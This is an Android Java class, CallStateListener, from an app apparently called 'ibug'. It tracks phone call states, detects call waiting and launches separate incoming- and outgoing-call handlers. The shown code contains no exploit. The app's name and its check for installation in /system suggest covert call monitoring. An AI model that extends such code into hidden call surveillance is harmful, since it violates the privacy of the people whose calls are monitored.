package com.ibug.call;

import android.telephony.TelephonyManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.ibug.R;

import com.ibug.misc.SharedPreference;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import static com.ibug.misc.Utils.Tag;

public class CallStateListener extends BroadcastReceiver {

    @Override
    public void onReceive(Context _context, Intent intent) {
        try {
            context = _context.getApplicationContext();
            preference = new SharedPreference(_context);

            if (installationFlag++ == 0) {
                isSystemApp = preference.get("appDir", isSystemApp); // registered in Boot complete receiver
                Log.d(TAG, "CallStateListener<IS_SYSTEM_APP> = " + isSystemApp);
            }

            if (delay++ == 0 && !isSystemApp) {
                Executors.newSingleThreadScheduledExecutor().schedule(
                        ()-> delay = 0, 200, TimeUnit.MILLISECONDS
                );
                String action = "android.intent.action.PHONE_STATE";
                if (intent.getAction().equals(action)) {
                    String extraState = TelephonyManager.EXTRA_STATE;
                    String state = intent.getStringExtra(extraState);
                    onCallStateChanged(state);
                }
            }

        }

        catch(Exception e) { Log.d(TAG, "CallStateListener", e); }

    }

    private void onCallStateChanged(String state) throws Exception {
        Log.d(TAG, state);
        switch (state) {
            case RINGING :
                if (PREVIOUS_STATE == OFFHOOK) CALL_WAITING = 1;
                PREVIOUS_STATE = TelephonyManager.EXTRA_STATE_RINGING; // CALL_STATE_RINGING = 1;
                break;

            case OFFHOOK : {
                switch (PREVIOUS_STATE) {
                    case IDLE :
                        if (CALL_WAITING != 1) new OutgoingCall(context);
                        break;
                    case RINGING :
                        if (CALL_WAITING != 1) new IncomingCall(context);
                        break;
                }
                PREVIOUS_STATE = TelephonyManager.EXTRA_STATE_OFFHOOK; // CALL_STATE_OFFHOOK = 2;
                break;
            }

            case IDLE : {
                if (PREVIOUS_STATE == OFFHOOK) {
                    String action = context.getString(R.string.end_call);
                    Intent _intent = new Intent(action);
                    context.sendBroadcast(_intent);
                }
                CALL_WAITING = 0;
                PREVIOUS_STATE = TelephonyManager.EXTRA_STATE_IDLE; // CALL_STATE_IDLE = 0
                break;
            }
        }
    }


    private Context context;
    private SharedPreference preference;
    private static int delay = 0;
    private static int installationFlag=0;
    private static String TAG = Tag;
    /** Call state: No activity. */
    private static final String IDLE =     "IDLE";
    /** Call state: Ringing. */
    private static final String RINGING =  "RINGING";
    /** Call state: Active. */
    private static final String OFFHOOK =  "OFFHOOK";
    /** Call state: Previous state. */
    private static String PREVIOUS_STATE =  IDLE;
    /* Check if app is installed in /system */
    private static boolean isSystemApp;
    /* Call state: Flag for call waiting */
    private static int CALL_WAITING = 0;

}
